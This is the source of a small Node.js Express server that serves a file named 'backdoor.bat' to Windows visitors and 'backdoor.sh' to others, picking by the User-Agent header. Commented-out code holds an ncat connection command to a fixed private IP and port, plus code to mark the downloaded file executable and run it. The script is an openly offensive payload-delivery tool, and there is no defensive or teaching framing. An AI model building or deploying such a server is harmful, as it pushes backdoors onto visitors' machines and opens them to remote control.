const { exec } = require("child_process");
const express = require("express");
const cors = require("cors");
const path = require("path");
const PORT = process.env.PORT || 3000;
const app = express();
app.use(
	cors({
		origin: "*",
	})
);
app.use(express.json());
app.get("/", (req, res) => {
	const userAgent = req.headers["user-agent"];
	const isWindows = userAgent.toLowerCase().includes("windows");

	let filePath;
	if (isWindows) {
		filePath = path.join(__dirname, "backdoor.bat");
		console.log("machine is windows");
		res.setHeader(
			"Content-Disposition",
			'attachment; filename="backdoor.bat"'
		);
		console.log(filePath);
	} else {
		filePath = path.join(__dirname, "backdoor.sh");
		res.setHeader(
			"Content-Disposition",
			'attachment; filename="backdoor.sh"'
		);
	}
	res.sendFile(filePath, (err) => {
		if (err) {
			console.log(`Error while sending file`, err.message);
		} else {
			console.log(`File successfully sent!`);
		}
	});
});

app.listen(PORT, () => {
	console.log(`Server listening on port ${PORT}`);
});

// let netcatCommand = "ncat -nv 192.168.3.67 5214";

//   res.download(filePath, (err) => {
//     if (err) {
//       console.error("Error while downloading the file", err);
//     } else {
//       if (!res.headersSent) {
//         if (isWindows) {
//           exec(filePath, (error, stdout, stderr) => {
//             if (error) {
//               console.error(`Error: ${error.message}`);
//               return;
//             }
//             if (stderr) {
//               console.error(`Stderr: ${stderr}`);
//               return;
//             }
//             console.log(`Stdout: ${stdout}`);
//           });
//         } else {
//           exec(
//             `chmod +x ${filePath} && ./${filePath}`,
//             (error, stdout, stderr) => {
//               if (error) {
//                 console.error("Error:", error.message);
//                 return;
//               }
//               if (stderr) {
//                 console.error("std Error:", stderr);
//                 return;
//               }
//               console.log(`Stdout: ${stdout}`);
//             }
//           );
//         }
//       }
//     }
//   });
